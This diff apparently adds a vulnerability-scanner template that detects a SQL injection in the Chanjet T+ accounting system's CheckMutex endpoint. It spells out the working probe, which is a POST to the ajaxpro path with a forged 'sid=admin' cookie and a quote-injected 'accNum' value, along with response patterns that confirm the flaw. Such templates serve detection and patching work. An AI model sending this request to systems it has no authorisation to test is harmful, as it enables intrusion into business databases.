@@ -1,0 +1,34 @@
+id: chanjet-tplus-checkmutex-sqli
+brief:
+    title: Chanjet Tplus CheckMutex - SQL Injection
+    by: unknown
+    level: high
+    about: There is an SQL injection vulnerability in the Changjetcrm financial crm system under Yonyou.
+    label:
+        - chanjet
+        - tplus
+        - sqli
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex'
+      head:
+        Content-Type: text/plain
+        Cookie: ASP.NET_SessionId=; sid=admin
+      body: '{"accNum": "6''", "functionTag": "SYS0104", "url": ""}'
+      signs:
+        - "on": word
+          has:
+            - order by begintime
+            - '"value":'
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/plain
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
